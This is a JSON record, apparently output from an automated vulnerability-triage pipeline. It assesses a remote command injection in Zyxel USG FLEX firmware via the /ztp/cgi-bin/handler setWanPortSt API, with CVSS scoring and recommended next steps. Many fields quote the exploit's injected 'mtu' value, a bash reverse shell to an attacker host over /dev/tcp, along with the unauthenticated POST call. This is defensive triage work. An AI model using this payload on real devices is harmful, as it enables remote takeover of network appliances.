@@ -1,0 +1,69 @@
+{
+  "proposal": {
+    "is_vulnerability_report": true,
+    "summary": "Remote command injection in Zyxel USG FLEX (ZLD5.00 through ZLD5.21) via the /ztp/cgi-bin/handler 'setWanPortSt' API where attacker-controlled 'mtu' is injected into a shell command, allowing remote command execution (reverse shell shown).",
+    "affected_product": "Zyxel USG FLEX (ZLD5.00 thru ZLD5.21)",
+    "cwe": "CWE-78",
+    "cwe_quote": "mtu\": f'; bash -c \"exec bash -i &>/dev/tcp/{host}/{port}<&1;\";',",
+    "cvss": {
+      "AV": {
+        "value": "N",
+        "quote": "args.url += \"/ztp/cgi-bin/handler\""
+      },
+      "AC": {
+        "value": "L",
+        "quote": "mtu\": f'; bash -c \"exec bash -i &>/dev/tcp/{host}/{port}<&1;\";',"
+      },
+      "PR": {
+        "value": "N",
+        "quote": "response = requests.post(\n            url=url, headers=headers, data=json.dumps(data), verify=False, timeout=5\n        )"
+      },
+      "UI": {
+        "value": "N",
+        "quote": "response = requests.post(\n            url=url, headers=headers, data=json.dumps(data), verify=False, timeout=5\n        )"
+      },
+      "S": {
+        "value": "U",
+        "quote": "mtu\": f'; bash -c \"exec bash -i &>/dev/tcp/{host}/{port}<&1;\";',"
+      },
+      "C": {
+        "value": "H",
+        "quote": "mtu\": f'; bash -c \"exec bash -i &>/dev/tcp/{host}/{port}<&1;\";',"
+      },
+      "I": {
+        "value": "H",
+        "quote": "mtu\": f'; bash -c \"exec bash -i &>/dev/tcp/{host}/{port}<&1;\";',"
+      },
+      "A": {
+        "value": "H",
+        "quote": "mtu\": f'; bash -c \"exec bash -i &>/dev/tcp/{host}/{port}<&1;\";',"
+      }
+    },
+    "recommended_next_step": "Confirm vulnerable endpoint and reproduce with safe non-interactive payload; collect exact affected firmware builds and request vendor patch or mitigation (e.g., input validation or command escaping) from Zyxel.",
+    "confidence": "high",
+    "evidence_quotes": [
+      {
+        "claim": "exploit demonstrates command injection leading to a reverse shell",
+        "quote": "mtu\": f'; bash -c \"exec bash -i &>/dev/tcp/{host}/{port}<&1;\";',"
+      },
+      {
+        "claim": "vulnerable endpoint path used by exploit",
+        "quote": "args.url += \"/ztp/cgi-bin/handler\""
+      },
+      {
+        "claim": "affected versions stated in report",
+        "quote": "Version: ZLD5.00 thru ZLD5.21"
+      },
+      {
+        "claim": "requests POST used to send JSON payload without authentication in the PoC",
+        "quote": "response = requests.post(\n            url=url, headers=headers, data=json.dumps(data), verify=False, timeout=5\n        )"
+      }
+    ]
+  },
+  "usage": {
+    "input_tokens": 2624,
+    "output_tokens": 787,
+    "latency_s": null,
+    "batch": true
+  }
+}
